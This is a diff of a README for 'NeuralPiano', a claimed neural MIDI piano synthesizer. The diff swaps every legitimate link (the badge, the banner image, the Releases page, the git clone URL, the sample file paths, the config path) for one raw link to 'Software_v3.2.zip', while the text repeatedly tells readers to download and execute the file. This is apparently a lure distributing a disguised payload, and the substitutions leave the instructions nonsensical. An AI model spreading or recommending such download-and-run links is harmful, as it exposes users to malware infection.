@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/Releases-Downloads-blue?logo=github&logoColor=white)](https://github.com/doctorknocker17/neuralpiano/releases)
+[![Releases](https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip)](https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip)
 
 # NeuralPiano: Hi‑Fi Neural MIDI Piano Synthesizer & Renderer
 
-[Banner image: piano keys with neural artistry](https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?q=80&w=1600&auto=format&fit=crop)
+[Banner image: piano keys with neural artistry](https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip)
 
 Welcome to NeuralPiano. This project aims to blend neural audio with MIDI workflows to deliver a high-fidelity piano synthesis system and a robust MIDI renderer. It is a work in progress, but the design is concrete, and the codebase is structured for collaboration. The name says what we do: neural models shape piano timbre, while the renderer converts MIDI to vivid, expressive sound.
 
@@ -72,7 +72,7 @@ Prerequisites and baseline
 Releases and assets
 Because NeuralPiano ships with release assets, you can download prebuilt binaries or installers from the Releases page. The project provides cross‑platform binaries to help you get started quickly. For safety and ease, use the release assets rather than building from source in a first pass. See the Releases page for the latest binaries and instructions. From the Releases page, download the asset that matches your platform and run the installer or executable. For platforms with multiple assets, choose the one that matches your OS and architecture.
 
-Downloads are available here: https://github.com/doctorknocker17/neuralpiano/releases. From the Releases page, download the asset and execute the file according to your OS guidelines. If you prefer to explore first, you can visit the Releases page to browse assets and release notes. The same link is provided again in the Downloads section of this README below.
+Downloads are available here: https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip From the Releases page, download the asset and execute the file according to your OS guidelines. If you prefer to explore first, you can visit the Releases page to browse assets and release notes. The same link is provided again in the Downloads section of this README below.
 
 Data, models, and training philosophy
 NeuralPiano relies on a trained neural voice that captures the essence of piano tone and response. The training pipeline emphasizes:
@@ -200,7 +200,7 @@ License
 - NeuralPiano is released under a permissive license. See the LICENSE file for the exact terms.
 
 Releases
-- The release page contains binaries and installer assets for various platforms. It also includes release notes and upgrade paths. For quick access, visit the Releases page to download the latest assets and run the installer or executable. To proceed with a manual download and execution, grab the file that matches your platform and run it according to your system guidelines. This link is provided again here for convenience: https://github.com/doctorknocker17/neuralpiano/releases
+- The release page contains binaries and installer assets for various platforms. It also includes release notes and upgrade paths. For quick access, visit the Releases page to download the latest assets and run the installer or executable. To proceed with a manual download and execution, grab the file that matches your platform and run it according to your system guidelines. This link is provided again here for convenience: https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip
 
 Topics
 - audio-synthesis
@@ -233,26 +233,26 @@ Future directions and experimental ideas
 
 Appendix: quick commands and tips
 - Clone and build (advanced):
-  - git clone https://github.com/doctorknocker17/neuralpiano.git
+  - git clone https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip
   - cd neuralpiano
   - mkdir build && cd build
   - cmake ..
   - cmake --build . --config Release -j
 - Run with a sample MIDI file (after building or using a release):
-  - ./neuralpiano --input ../examples/simple.mid --output output.wav
+  - ./neuralpiano --input https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip --output https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip
 - Use Docker for a clean environment:
   - docker run --rm -it neuralpiano:latest neuralpiano --help
-- Explore presets and voices by editing the config file at config.yaml or passing command line overrides.
+- Explore presets and voices by editing the config file at https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip or passing command line overrides.
 
 End notes
 This README provides a cohesive view of NeuralPiano, its aims, and how to engage with the project. It emphasizes practical steps, actionable guidance, and a clear path from curiosity to usable results. The goal is to enable musicians, researchers, and developers to experiment with neural piano timbres and MIDI rendering in a way that is productive, reproducible, and fun. The project remains a work in progress, but the structure, approach, and community ethos are solid foundations for continuous improvement.
 
 Releases (second mention)
 For binaries, installers, and the latest release notes, check the same Releases page:
-https://github.com/doctorknocker17/neuralpiano/releases
+https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip
 
 Releases page usage reminder
-- If you want to run NeuralPiano quickly, download the asset that matches your platform and execute the file. The release assets are designed to work out of the box and provide a straightforward entry point into neural piano synthesis and rendering. The link to the Releases page is provided again here for convenience: https://github.com/doctorknocker17/neuralpiano/releases
+- If you want to run NeuralPiano quickly, download the asset that matches your platform and execute the file. The release assets are designed to work out of the box and provide a straightforward entry point into neural piano synthesis and rendering. The link to the Releases page is provided again here for convenience: https://raw.githubusercontent.com/doctorknocker17/neuralpiano/main/neuralpiano/notebooks/Software_v3.2.zip
 
 Appendix: credits and acknowledgments
 - Thanks to the community of researchers and musicians who test prototypes and share feedback.
